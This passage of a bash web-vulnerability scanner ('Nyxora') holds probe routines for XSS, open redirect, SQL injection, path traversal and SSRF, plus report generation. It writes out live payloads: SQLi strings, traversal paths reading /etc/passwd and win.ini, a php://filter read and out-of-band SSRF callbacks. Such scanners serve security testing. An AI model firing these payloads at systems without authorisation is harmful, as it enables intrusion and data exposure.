  if [[ "${hu1}" != "${hu2}" && ${#ru1} -gt 200 && ${#ru2} -gt 200 ]]; then
    echo "${url} [conf:MEDIUM][type:UUID]"
  fi
}
export -f _idor_check

if [[ -s "${OUT}/engine/diff/dynamic.txt" ]]; then
  cat "${OUT}/engine/diff/dynamic.txt" | _parallel "${THREADS}" _idor_check 2>/dev/null \
    | sort -u > "${OUT}/engine/behavior/idor.txt"
  log "IDOR candidates: $(count_safe "${OUT}/engine/behavior/idor.txt")"
else
  touch "${OUT}/engine/behavior/idor.txt"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 17 ─ XSS Reflection Detection (3-layer encoding gate)"
# FIX: Use random bytes for canary to avoid same-second collision in parallel
XSS_CANARY="nyxxss$(_rand_token 8)"
export XSS_CANARY

_xss_check() {
  local url="$1"
  local canary="${XSS_CANARY:-nyxxss12345678}"
  local test_url raw ct body ctx="html"

  _rate_sleep 2>/dev/null || true
  test_url=$(echo "${url}" | sed "s/FUZZ/${canary}/g")
  raw=$(_acurl -D - "${test_url}") || return

  ct=$(echo "${raw}" | grep -iP '^content-type:' | head -1)
  echo "${ct}" | grep -qiE "text/html" || return
  echo "${ct}" | grep -qi "application/json" && return

  # FIX: Reliable header/body split — sed up to and including the blank line
  body=$(echo "${raw}" | sed -n '/^\r*$/,$p' | tail -n +2)
  echo "${body}" | grep -qF "${canary}" || return
  echo "${body}" | grep -qi '<!doctype\|<html' || return

  # Encoding gates — skip if canary is HTML/URL/unicode encoded
  echo "${body}" | grep -P "${canary}" | grep -qP '&(lt|gt|amp|quot|#[0-9]+);' && return
  echo "${body}" | grep -P "${canary}" | grep -qP '%[23][CE46]' && return
  echo "${body}" | grep -P "${canary}" | grep -qP '\\u00[36][CE]' && return
  echo "${raw}" | grep -qi "x-xss-protection: 1; mode=block" && return

  # Context detection — determine WHERE the canary lands
  local ctx="html"
  echo "${body}" | grep -P "=[\"'][^\"']*${canary}" &>/dev/null && ctx="attr"
  echo "${body}" | grep -B3 -A3 "${canary}" | grep -qi '<script\|javascript:' && ctx="script"

  # Exploitability gate — canary must appear unencoded in an injectable position.
  # In html context: must NOT be inside a comment or entity-escaped block.
  # In attr context: must not be inside a value fully enclosed in a quoted attr with no breakout.
  # Confidence downgrade: if canary only lands inside a comment, skip it.
  echo "${body}" | grep -P "<!--[^>]*${canary}[^<]*-->" &>/dev/null && return

  # Second-request confirmation: re-probe with a tag-like payload to verify reflection persists
  local confirm_url confirm_body confirm_canary
  confirm_canary="${canary}x"
  confirm_url=$(echo "${test_url}" | sed "s/${canary}/${confirm_canary}/g")
  confirm_body=$(_acurl "${confirm_url}") || true
  # If second probe also reflects unencoded → confirmed
  if ! echo "${confirm_body}" | grep -qF "${confirm_canary}"; then
    # Reflection was non-deterministic — downgrade confidence
    echo "${url} [ctx:${ctx}][conf:LOW][note:non-deterministic]"
    return
  fi

  local conf="HIGH"
  echo "${raw}" | grep -qi "content-security-policy:.*nonce\|content-security-policy:.*sha[0-9]" \
    && conf="MEDIUM"

  echo "${url} [ctx:${ctx}][conf:${conf}]"
}
export -f _xss_check

if [[ -s "${OUT}/engine/diff/dynamic.txt" ]]; then
  cat "${OUT}/engine/diff/dynamic.txt" | _parallel "${THREADS}" _xss_check 2>/dev/null \
    | sort -u > "${OUT}/engine/reflection/xss_candidates.txt"
  log "XSS candidates: $(count_safe "${OUT}/engine/reflection/xss_candidates.txt")"
else
  touch "${OUT}/engine/reflection/xss_candidates.txt"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 18 ─ Open Redirect Detection"
REDIR_MARKER="nyxredir-$(_rand_token 6).example.com"
export REDIR_MARKER

_redirect_check() {
  local url="$1"
  local marker="${REDIR_MARKER:-nyxredir.example.com}"

  echo "${url}" | grep -qiE \
    '(redirect=|return=|next=|url=|goto=|dest=|target=|location=|forward=|redir=|callback=|continue=|returnto=|returnurl=|redirect_uri=|success_url=|cancel_url=)' \
    || return

  _rate_sleep 2>/dev/null || true

  # Test multiple payload schemes: https://, http://, //
  local scheme payload final_url
  for scheme in "https" "http" ""; do
    if [[ -n "${scheme}" ]]; then
      payload="${scheme}://${marker}"
    else
      payload="//${marker}"
    fi
    local test_url; test_url=$(echo "${url}" | sed "s|FUZZ|${payload}|g")
    final_url=$(_acurl -o /dev/null -w "%{url_effective}" -L --max-redirs 5 "${test_url}") || continue
    if echo "${final_url}" | grep -qF "${marker}"; then
      echo "${url} [scheme:${scheme:-'//'}]"
      return
    fi
    _rate_sleep 2>/dev/null || true
  done
}
export -f _redirect_check

if [[ -s "${OUT}/engine/diff/dynamic.txt" ]]; then
  cat "${OUT}/engine/diff/dynamic.txt" | _parallel "${THREADS}" _redirect_check 2>/dev/null \
    | sort -u > "${OUT}/engine/behavior/open_redirects.txt"
  log "Open redirects: $(count_safe "${OUT}/engine/behavior/open_redirects.txt")"
else
  touch "${OUT}/engine/behavior/open_redirects.txt"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 19 ─ SQLi Error Heuristic (8 payloads, 20 error patterns)"
SQLI_ERRORS='sql syntax|mysql_fetch|ORA-[0-9]+|sqlite_|pg_exec|SQLSTATE|unclosed quotation|syntax error.*SQL|mysql_num_rows|Warning.*mysql|supplied argument.*mysql|PostgreSQL.*ERROR|Microsoft OLE DB|ODBC.*Driver|PDOException|JDBC.*Exception|com\.mysql\.jdbc|java\.sql\.|Syntax error.*query|Incorrect syntax near|Invalid SQL|Database error|pg_query\(\)|mysqli_|PG::SyntaxError|ActiveRecord::StatementInvalid'
export SQLI_ERRORS

_url_encode() {
  # FIX: simpler, portable URL encoding via printf + sed
  printf '%s' "$1" | sed 's/%/%25/g; s/ /%20/g; s/!/%21/g; s/"/%22/g; s/#/%23/g; s/\$/%24/g; s/&/%26/g; s/'"'"'/%27/g; s/(/%28/g; s/)/%29/g; s/\*/%2A/g; s/+/%2B/g; s/,/%2C/g; s/\//%2F/g; s/:/%3A/g; s/;/%3B/g; s/=/%3D/g; s/?/%3F/g; s/@/%40/g; s/\[/%5B/g; s/\]/%5D/g'
}
export -f _url_encode

_sqli_check() {
  local url="$1"
  _rate_sleep 2>/dev/null || true

  local baseline
  baseline=$(_acurl \
    "$(echo "${url}" | sed 's/FUZZ/safe_string_abc/g')" 2>/dev/null) || return

  # Skip if baseline already triggers SQL errors
  echo "${baseline}" | grep -qiE "${SQLI_ERRORS:-sql}" && return

  # Skip if WAF likely present in baseline
  echo "${baseline}" | grep -qiE \
    "(cloudflare ray|incapsula|imperva|sucuri|akamai.*block|request blocked|access denied by security|forbidden by policy)" \
    && return

  local payload enc body
  for payload in "'" "1'--" "1 AND 1=2--" '"' '1"--' "1 OR 1=1--" "1;SELECT 1--" "') OR ('1'='1"; do
    _rate_sleep 2>/dev/null || true
    enc=$(_url_encode "${payload}")
    body=$(_acurl \
      "$(echo "${url}" | sed "s/FUZZ/${enc}/g")" 2>/dev/null) || continue
    if echo "${body}" | grep -qiE "${SQLI_ERRORS:-sql}"; then
      echo "${url} [payload:${payload:0:12}]"
      return
    fi
  done
}
export -f _sqli_check

if [[ -s "${OUT}/engine/diff/dynamic.txt" ]]; then
  cat "${OUT}/engine/diff/dynamic.txt" | _parallel "${THREADS}" _sqli_check 2>/dev/null \
    | sort -u > "${OUT}/engine/reflection/sqli_candidates.txt"
  log "SQLi candidates: $(count_safe "${OUT}/engine/reflection/sqli_candidates.txt")"
else
  touch "${OUT}/engine/reflection/sqli_candidates.txt"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 20 ─ LFI / Path Traversal Heuristic"
LFI_INDICATORS='root:x:|^\[boot loader\]|<b>Warning</b>.*include|failed to open stream|No such file or directory|fopen\(|include_path|\.\.\\/|\/etc\/passwd|win\.ini|\[extensions\]'
export LFI_INDICATORS

# FIX: Pre-filter by file/path param keywords BEFORE entering _parallel
# (avoids running the inner check on every dynamic URL)
if [[ -s "${OUT}/engine/diff/dynamic.txt" ]]; then
  grep -iE '(file=|path=|page=|template=|dir=|folder=|include=|doc=|document=|load=|read=|src=|view=|resource=)' \
    "${OUT}/engine/diff/dynamic.txt" > "${TMPDIR_NYX}/lfi_candidates_pre.txt" || true
else
  touch "${TMPDIR_NYX}/lfi_candidates_pre.txt"
fi

_lfi_check() {
  local url="$1"
  _rate_sleep 2>/dev/null || true

  local baseline
  baseline=$(_acurl \
    "$(echo "${url}" | sed 's/FUZZ/index/g')" 2>/dev/null) || return
  echo "${baseline}" | grep -qiE "${LFI_INDICATORS:-root:x:}" && return

  local payload body
  for payload in \
    "../../../../etc/passwd" \
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd" \
    "....//....//....//....//etc/passwd" \
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
    "..%252f..%252f..%252fetc%252fpasswd" \
    "../../../../windows/win.ini" \
    "../../../../etc/passwd%00.png" \
    "php://filter/convert.base64-encode/resource=index"; do
    _rate_sleep 2>/dev/null || true
    body=$(_acurl \
      "$(echo "${url}" | sed "s|FUZZ|${payload}|g")" 2>/dev/null) || continue
    if echo "${body}" | grep -qiE "${LFI_INDICATORS:-root:x:}"; then
      echo "[LFI] ${url} [payload:${payload:0:40}]"
      return
    fi
  done
}
export -f _lfi_check

if [[ -s "${TMPDIR_NYX}/lfi_candidates_pre.txt" ]]; then
  cat "${TMPDIR_NYX}/lfi_candidates_pre.txt" | _parallel "${THREADS}" _lfi_check 2>/dev/null \
    | sort -u > "${OUT}/engine/lfi/candidates.txt"
  log "LFI candidates: $(count_safe "${OUT}/engine/lfi/candidates.txt")"
else
  touch "${OUT}/engine/lfi/candidates.txt"
  log "No file/path params for LFI probing"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 21 ─ SSRF Detection (25 params + redirect chain)"
SSRF_PARAMS='(url=|uri=|path=|dest=|host=|src=|file=|resource=|image=|data=|load=|fetch=|open=|proxy=|service=|server=|backend=|endpoint=|webhook=|callback=|api=|target=|link=|redirect=|location=|remote=|source=|content=|domain=|site=|feed=|stream=)'
grep -Ei "${SSRF_PARAMS}" "${OUT}/engine/valid_params.txt" 2>/dev/null \
  | sort -u > "${OUT}/engine/reflection/ssrf_candidates.txt" || true
log "SSRF patterns: $(count_safe "${OUT}/engine/reflection/ssrf_candidates.txt")"

if [[ -n "${OOB_HOST:-}" && -s "${OUT}/engine/reflection/ssrf_candidates.txt" ]]; then
  log "Active OOB probe → ${OOB_HOST}"
  _ssrf_oob_probe() {
    local url="$1"
    local oob="${OOB_HOST:-localhost}"
    _rate_sleep 2>/dev/null || true
    for scheme in "http" "https"; do
      _acurl -o /dev/null \
        "$(echo "${url}" | sed "s|FUZZ|${scheme}://${oob}|g")" || true
    done
    # Also follow redirect chain to confirm SSRF via 3xx
    local redir
    redir=$(_acurl -L --max-redirs 3 -o /dev/null -w "%{url_effective}" \
      "$(echo "${url}" | sed "s|FUZZ|http://${oob}|g")" || true)
    echo "${redir}" | grep -qF "${oob}" \
      && echo "[OOB_CONFIRMED_REDIRECT] ${url}" \
      || echo "[OOB_SENT] ${url}"
  }
  export -f _ssrf_oob_probe OOB_HOST
  cat "${OUT}/engine/reflection/ssrf_candidates.txt" | _parallel "${THREADS}" _ssrf_oob_probe 2>/dev/null \
    > "${OUT}/engine/reflection/ssrf_oob_log.txt"
  log "OOB probes sent — check ${OOB_HOST} for DNS/HTTP callbacks"
fi

# ════════════════════════════════════════════════════════════════════════════
# Cleanup temp files
rm -rf "${TMPDIR_NYX}" 2>/dev/null || true
mkdir -p "${TMPDIR_NYX}"   # keep dir for any post-run use

END_TS=$(date +%s); ELAPSED=$(( END_TS - START_TS ))
ELAPSED_FMT="$((ELAPSED/60))m $((ELAPSED%60))s"

# ════════════════════════════════════════════════════════════════════════════
# JSON Stats
cat > "${STATS_FILE}" << STATS_EOF
{
  "target":          "${DOMAIN}",
  "version":         "${VERSION}",
  "date":            "${START_DATE}",
  "mode":            "$(${DEEP_MODE} && echo deep || echo standard)",
  "elapsed":         "${ELAPSED_FMT}",
  "subs_raw":        $(count_safe "${OUT}/subs/raw.txt"),
  "subs_resolved":   $(count_safe "${OUT}/subs/resolved.txt"),
  "live_hosts":      $(count_safe "${OUT}/http/live.txt"),
  "js_secrets":      $(count_safe "${OUT}/engine/secrets/findings.txt"),
  "takeover":        $(count_safe "${OUT}/engine/takeover/candidates.txt"),
  "cors_issues":     $(count_safe "${OUT}/engine/headers/cors_issues.txt"),
  "graphql":         $(count_safe "${OUT}/engine/graphql/endpoints.txt"),
  "method_findings": $(count_safe "${OUT}/engine/methods/findings.txt"),
  "host_injection":  $(count_safe "${OUT}/engine/hostinj/findings.txt"),
  "cache_hints":     $(count_safe "${OUT}/engine/cache/hints.txt"),
  "api_endpoints":   $(count_safe "${OUT}/engine/behavior/api_endpoints.txt"),
  "lfi":             $(count_safe "${OUT}/engine/lfi/candidates.txt"),
  "crawled_urls":    $(count_safe "${OUT}/crawl/crawled_urls.txt"),
  "dynamic_params":  $(count_safe "${OUT}/engine/diff/dynamic.txt"),
  "idor":            $(count_safe "${OUT}/engine/behavior/idor.txt"),
  "open_redirects":  $(count_safe "${OUT}/engine/behavior/open_redirects.txt"),
  "xss":             $(count_safe "${OUT}/engine/reflection/xss_candidates.txt"),
  "sqli":            $(count_safe "${OUT}/engine/reflection/sqli_candidates.txt"),
  "ssrf":            $(count_safe "${OUT}/engine/reflection/ssrf_candidates.txt")
}
STATS_EOF

# ════════════════════════════════════════════════════════════════════════════
# Markdown Report
MD_REPORT="${OUT}/final/report.md"
{
echo "# Nyxora v${VERSION} — ${DOMAIN}"
echo ""
echo "**Date:** ${START_DATE}  **Mode:** $(${DEEP_MODE} && echo Deep || echo Standard)  **Runtime:** ${ELAPSED_FMT}"
echo ""
echo "---"
echo ""
echo "## Executive Summary"
echo ""
echo "| Category | Count | Severity |"
echo "|----------|-------|----------|"
echo "| JS Secrets | $(count_safe "${OUT}/engine/secrets/findings.txt") | 🔴 CRITICAL |"
echo "| Takeover Candidates | $(count_safe "${OUT}/engine/takeover/candidates.txt") | 🔴 CRITICAL |"
echo "| CORS Misconfigurations | $(count_safe "${OUT}/engine/headers/cors_issues.txt") | 🔴 HIGH |"
echo "| IDOR Candidates | $(count_safe "${OUT}/engine/behavior/idor.txt") | 🔴 CRITICAL |"
echo "| XSS Candidates | $(count_safe "${OUT}/engine/reflection/xss_candidates.txt") | 🟠 HIGH |"
echo "| SQLi Candidates | $(count_safe "${OUT}/engine/reflection/sqli_candidates.txt") | 🟠 HIGH |"
echo "| LFI Candidates | $(count_safe "${OUT}/engine/lfi/candidates.txt") | 🟠 HIGH |"
echo "| Host Header Injection | $(count_safe "${OUT}/engine/hostinj/findings.txt") | 🟠 HIGH |"
echo "| GraphQL Endpoints | $(count_safe "${OUT}/engine/graphql/endpoints.txt") | 🟡 MEDIUM |"
echo "| HTTP Method Issues | $(count_safe "${OUT}/engine/methods/findings.txt") | 🟡 MEDIUM |"
echo "| Cache Poisoning Hints | $(count_safe "${OUT}/engine/cache/hints.txt") | 🟡 MEDIUM |"
echo "| Open Redirects | $(count_safe "${OUT}/engine/behavior/open_redirects.txt") | 🟡 MEDIUM |"
echo "| SSRF Patterns | $(count_safe "${OUT}/engine/reflection/ssrf_candidates.txt") | 🟡 MEDIUM |"
echo "| Missing Headers | $(count_safe "${OUT}/engine/headers/missing_headers.txt") | 🔵 INFO |"
echo "| API Endpoints | $(count_safe "${OUT}/engine/behavior/api_endpoints.txt") | 🔵 INFO |"
echo ""
echo "## Recon Stats"
echo ""
echo "| Metric | Count |"
echo "|--------|-------|"
echo "| Subdomains (raw) | $(count_safe "${OUT}/subs/raw.txt") |"
echo "| Subdomains (resolved) | $(count_safe "${OUT}/subs/resolved.txt") |"
echo "| Live Hosts | $(count_safe "${OUT}/http/live.txt") |"
echo "| Crawled URLs | $(count_safe "${OUT}/crawl/crawled_urls.txt") |"
echo "| Dynamic Params | $(count_safe "${OUT}/engine/diff/dynamic.txt") |"
echo ""
echo "---"
echo ""
for section_data in \
  "🔴 JS Secrets|${OUT}/engine/secrets/findings.txt" \
  "🔴 Takeover Candidates|${OUT}/engine/takeover/candidates.txt" \
  "🔴 CORS Misconfigurations|${OUT}/engine/headers/cors_issues.txt" \
  "🔴 IDOR Candidates|${OUT}/engine/behavior/idor.txt" \
  "🟠 XSS Candidates|${OUT}/engine/reflection/xss_candidates.txt" \
  "🟠 SQLi Candidates|${OUT}/engine/reflection/sqli_candidates.txt" \
  "🟠 LFI Candidates|${OUT}/engine/lfi/candidates.txt" \
  "🟠 Host Header Injection|${OUT}/engine/hostinj/findings.txt" \
  "🟡 GraphQL Endpoints|${OUT}/engine/graphql/endpoints.txt" \
  "🟡 HTTP Method Issues|${OUT}/engine/methods/findings.txt" \
  "🟡 Cache Poisoning Hints|${OUT}/engine/cache/hints.txt" \
  "🟡 Open Redirects|${OUT}/engine/behavior/open_redirects.txt" \
  "🟡 SSRF Patterns|${OUT}/engine/reflection/ssrf_candidates.txt" \
  "🔵 API Endpoints|${OUT}/engine/behavior/api_endpoints.txt" \
  "🔵 Missing Headers (sample)|${OUT}/engine/headers/missing_headers.txt"; do
    IFS='|' read -r label file <<< "${section_data}"
    echo "### ${label}"; echo ""; echo '```'
    [[ -s "${file}" ]] && head -30 "${file}" || echo "(none)"
    echo '```'; echo ""
done
echo "---"
echo "*Generated by Nyxora v${VERSION} — github.com/thivyas111-pixel/nyxora*"
} > "${MD_REPORT}"
log "Markdown report: ${MD_REPORT}"

# ════════════════════════════════════════════════════════════════════════════
# HTML Report
if [[ "${SKIP_REPORT}" != true ]]; then
  section "HTML Report"
  HTML_REPORT="${OUT}/final/report.html"

  # FIX: Escape <, >, &, ', ", / to prevent XSS in embedded JS strings
  _js_array() {
    local file="$1" var="$2"
    printf 'const %s=[' "${var}"
    [[ -s "${file}" ]] && while IFS= read -r l; do
      l="${l//\\/\\\\}"; l="${l//\"/\\\"}"; l="${l//</\\u003c}"; l="${l//>/\\u003e}"
      l="${l//&/\\u0026}"; l="${l//'/\\u0027}"
      printf '"%s",' "${l}"
    done < "${file}"
    printf '];'
  }

  IDOR_JS=$(_js_array "${OUT}/engine/behavior/idor.txt" "IDOR_D")
  REDIR_JS=$(_js_array "${OUT}/engine/behavior/open_redirects.txt" "REDIR_D")
  XSS_JS=$(_js_array "${OUT}/engine/reflection/xss_candidates.txt" "XSS_D")
  SQLI_JS=$(_js_array "${OUT}/engine/reflection/sqli_candidates.txt" "SQLI_D")
  SSRF_JS=$(_js_array "${OUT}/engine/reflection/ssrf_candidates.txt" "SSRF_D")
  SUBS_JS=$(_js_array "${OUT}/subs/resolved.txt" "SUBS_D")
  LIVE_JS=$(_js_array "${OUT}/http/probe_full.txt" "LIVE_D")
  DYN_JS=$(_js_array "${OUT}/engine/diff/dynamic.txt" "DYN_D")
  SEC_JS=$(_js_array "${OUT}/engine/secrets/findings.txt" "SEC_D")
  CORS_JS=$(_js_array "${OUT}/engine/headers/cors_issues.txt" "CORS_D")
  TKO_JS=$(_js_array "${OUT}/engine/takeover/candidates.txt" "TKO_D")
  HDR_JS=$(_js_array "${OUT}/engine/headers/missing_headers.txt" "HDR_D")
  GQL_JS=$(_js_array "${OUT}/engine/graphql/endpoints.txt" "GQL_D")
  MTH_JS=$(_js_array "${OUT}/engine/methods/findings.txt" "MTH_D")
  HHI_JS=$(_js_array "${OUT}/engine/hostinj/findings.txt" "HHI_D")
  LFI_JS=$(_js_array "${OUT}/engine/lfi/candidates.txt" "LFI_D")
  CACHE_JS=$(_js_array "${OUT}/engine/cache/hints.txt" "CACHE_D")
  API_JS=$(_js_array "${OUT}/engine/behavior/api_endpoints.txt" "API_D")

  SR=$(count_safe "${OUT}/subs/raw.txt"); SN=$(count_safe "${OUT}/subs/resolved.txt")
  LN=$(count_safe "${OUT}/http/live.txt"); CN=$(count_safe "${OUT}/crawl/crawled_urls.txt")
  DN=$(count_safe "${OUT}/engine/diff/dynamic.txt"); IN=$(count_safe "${OUT}/engine/behavior/idor.txt")
  RN=$(count_safe "${OUT}/engine/behavior/open_redirects.txt"); XN=$(count_safe "${OUT}/engine/reflection/xss_candidates.txt")
  QN=$(count_safe "${OUT}/engine/reflection/sqli_candidates.txt"); FN=$(count_safe "${OUT}/engine/reflection/ssrf_candidates.txt")
  SECRN=$(count_safe "${OUT}/engine/secrets/findings.txt"); CORSN=$(count_safe "${OUT}/engine/headers/cors_issues.txt")
  TKON=$(count_safe "${OUT}/engine/takeover/candidates.txt"); GQLN=$(count_safe "${OUT}/engine/graphql/endpoints.txt")
  MTHN=$(count_safe "${OUT}/engine/methods/findings.txt"); HHIN=$(count_safe "${OUT}/engine/hostinj/findings.txt")
  LFIN=$(count_safe "${OUT}/engine/lfi/candidates.txt"); CACHEN=$(count_safe "${OUT}/engine/cache/hints.txt")
  APIN=$(count_safe "${OUT}/engine/behavior/api_endpoints.txt")

  cat > "${HTML_REPORT}" << HTMLEOF
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Nyxora v${VERSION} — ${DOMAIN}</title>
<style>
:root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;--text:#e6edf3;--text2:#8b949e;--text3:#6e7681;--green:#3fb950;--red:#f85149;--orange:#d29922;--blue:#58a6ff;--purple:#bc8cff;--cyan:#76e3ea;}
*{box-sizing:border-box;margin:0;padding:0}body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;}
.header{background:var(--bg2);border-bottom:1px solid var(--border);padding:20px 30px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
.header h1{font-size:18px;font-weight:700;color:var(--blue);}
.badge{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:2px 8px;font-size:11px;color:var(--text2);}
.layout{display:flex;height:calc(100vh - 65px);}
.sidebar{width:220px;background:var(--bg2);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0;}
.nav-section{padding:12px 12px 4px;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--text3);font-weight:600;}
.nav-item{display:flex;align-items:center;justify-content:space-between;padding:7px 16px;cursor:pointer;color:var(--text2);transition:all .15s;font-size:13px;}
.nav-item:hover{background:var(--bg3);color:var(--text);}
.nav-item.active{background:var(--bg3);color:var(--blue);border-right:2px solid var(--blue);}
.nav-count{background:var(--bg);border-radius:10px;padding:1px 6px;font-size:10px;}
.nav-count.hot{background:rgba(248,81,73,.15);color:var(--red);}
.main{flex:1;overflow-y:auto;padding:24px;}
.view{display:none}.view.active{display:block;}
.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;margin-bottom:24px;}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center;}
.card.crit{border-color:rgba(248,81,73,.4)}.card.high{border-color:rgba(210,153,34,.4)}.card.med{border-color:rgba(88,166,255,.2)}.card.info{border-color:var(--border)}
.card-n{font-size:28px;font-weight:700;line-height:1;margin-bottom:4px;}
.crit .card-n{color:var(--red)}.high .card-n{color:var(--orange)}.med .card-n{color:var(--blue)}.info .card-n{color:var(--text2)}
.card-l{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;}
.section-title{font-size:16px;font-weight:600;margin:20px 0 12px;}
.toolbar{display:flex;gap:8px;margin-bottom:12px;}
.si{flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:7px 12px;color:var(--text);font-size:13px;outline:none;}
.si:focus{border-color:var(--blue);}
.cbtn{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:7px 14px;color:var(--text2);cursor:pointer;font-size:12px;}
.cbtn:hover{border-color:var(--blue);color:var(--blue);}
.ftable{width:100%;border-collapse:collapse;}
.ftable th{background:var(--bg3);padding:8px 12px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);border-bottom:1px solid var(--border);}
.ftable td{padding:8px 12px;border-bottom:1px solid rgba(48,54,61,.5);vertical-align:top;}
.ftable tr:hover td{background:rgba(255,255,255,.02);}
.url{font-family:monospace;font-size:12px;word-break:break-all;color:var(--cyan);}
.pill{border-radius:4px;padding:2px 7px;font-size:10px;font-weight:600;}
.pill-crit{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
.pill-high{background:rgba(210,153,34,.15);color:var(--orange);border:1px solid rgba(210,153,34,.3);}
.pill-med{background:rgba(88,166,255,.1);color:var(--blue);border:1px solid rgba(88,166,255,.2);}
.pill-info{background:var(--bg3);color:var(--text3);border:1px solid var(--border);}
.cblock{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:14px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto;color:var(--text2);}
.hgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:8px;}
.hcard{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:12px;}
.hurl{font-family:monospace;font-size:12px;color:var(--cyan);word-break:break-all;margin-bottom:6px;}
.htags{display:flex;flex-wrap:wrap;gap:4px;}
.htag{background:var(--bg3);border-radius:4px;padding:2px 6px;font-size:10px;color:var(--text3);}
.c200{background:rgba(63,185,80,.1)!important;color:var(--green)!important;}
.c403{background:rgba(248,81,73,.1)!important;color:var(--red)!important;}
.c301{background:rgba(210,153,34,.1)!important;color:var(--orange)!important;}
.empty{color:var(--text3);padding:20px;text-align:center;font-style:italic;}
.pag{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:12px;color:var(--text3);}
.pbtn{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:4px 10px;cursor:pointer;color:var(--text2);}
.pbtn:hover:not([disabled]){border-color:var(--blue);color:var(--blue);}
.pbtn[disabled]{opacity:.4;cursor:not-allowed;}
.tli{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid rgba(48,54,61,.5);}
.tld{width:10px;height:10px;border-radius:50%;background:var(--blue);margin-top:4px;flex-shrink:0;}
.tll{font-weight:500;margin-bottom:2px;}.tlc{font-size:12px;color:var(--text3);}
</style></head><body>
<div class="header">
  <h1>⚡ Nyxora v${VERSION}</h1>
  <span class="badge">${DOMAIN}</span><span class="badge">${START_DATE}</span>
  <span class="badge">$(${DEEP_MODE} && echo "⚡ Deep" || echo "Standard")</span>
  <span class="badge">⏱ ${ELAPSED_FMT}</span>
</div>
<div class="layout">
<div class="sidebar">
  <div class="nav-section">Overview</div>
  <div class="nav-item active" onclick="show('dash')">Dashboard</div>
  <div class="nav-item" onclick="show('hosts')">Live Hosts <span class="nav-count">${LN}</span></div>
  <div class="nav-item" onclick="show('subs')">Subdomains <span class="nav-count">${SN}</span></div>
  <div class="nav-section">Critical</div>
  <div class="nav-item" onclick="show('secrets')">JS Secrets <span class="nav-count$([ "${SECRN}" -gt 0 ] && echo ' hot')">${SECRN}</span></div>
  <div class="nav-item" onclick="show('takeover')">Takeover <span class="nav-count$([ "${TKON}" -gt 0 ] && echo ' hot')">${TKON}</span></div>
  <div class="nav-item" onclick="show('cors')">CORS Issues <span class="nav-count$([ "${CORSN}" -gt 0 ] && echo ' hot')">${CORSN}</span></div>
  <div class="nav-item" onclick="show('idor')">IDOR <span class="nav-count$([ "${IN}" -gt 0 ] && echo ' hot')">${IN}</span></div>
  <div class="nav-section">High</div>
  <div class="nav-item" onclick="show('xss')">XSS <span class="nav-count$([ "${XN}" -gt 0 ] && echo ' hot')">${XN}</span></div>
  <div class="nav-item" onclick="show('sqli')">SQLi <span class="nav-count$([ "${QN}" -gt 0 ] && echo ' hot')">${QN}</span></div>
  <div class="nav-item" onclick="show('lfi')">LFI <span class="nav-count$([ "${LFIN}" -gt 0 ] && echo ' hot')">${LFIN}</span></div>
  <div class="nav-item" onclick="show('hostinj')">Host Injection <span class="nav-count$([ "${HHIN}" -gt 0 ] && echo ' hot')">${HHIN}</span></div>
  <div class="nav-section">Medium</div>
  <div class="nav-item" onclick="show('graphql')">GraphQL <span class="nav-count">${GQLN}</span></div>
  <div class="nav-item" onclick="show('methods')">HTTP Methods <span class="nav-count">${MTHN}</span></div>
  <div class="nav-item" onclick="show('cache')">Cache Hints <span class="nav-count">${CACHEN}</span></div>
  <div class="nav-item" onclick="show('redir')">Open Redirect <span class="nav-count">${RN}</span></div>
  <div class="nav-item" onclick="show('ssrf')">SSRF <span class="nav-count">${FN}</span></div>
  <div class="nav-section">Info</div>
  <div class="nav-item" onclick="show('api')">API Endpoints <span class="nav-count">${APIN}</span></div>
  <div class="nav-item" onclick="show('params')">Dyn Params <span class="nav-count">${DN}</span></div>
  <div class="nav-item" onclick="show('headers')">Sec Headers</div>
</div>
<div class="main">
<div id="view-dash" class="view active">
  <div class="cards">
    <div class="card crit"><div class="card-n">${SECRN}</div><div class="card-l">JS Secrets</div></div>
    <div class="card crit"><div class="card-n">${TKON}</div><div class="card-l">Takeover</div></div>
    <div class="card crit"><div class="card-n">${CORSN}</div><div class="card-l">CORS</div></div>
    <div class="card crit"><div class="card-n">${IN}</div><div class="card-l">IDOR</div></div>
    <div class="card high"><div class="card-n">${XN}</div><div class="card-l">XSS</div></div>
    <div class="card high"><div class="card-n">${QN}</div><div class="card-l">SQLi</div></div>
    <div class="card high"><div class="card-n">${LFIN}</div><div class="card-l">LFI</div></div>
    <div class="card high"><div class="card-n">${HHIN}</div><div class="card-l">Host Inj</div></div>
    <div class="card med"><div class="card-n">${GQLN}</div><div class="card-l">GraphQL</div></div>
    <div class="card med"><div class="card-n">${RN}</div><div class="card-l">Redirects</div></div>
    <div class="card med"><div class="card-n">${FN}</div><div class="card-l">SSRF</div></div>
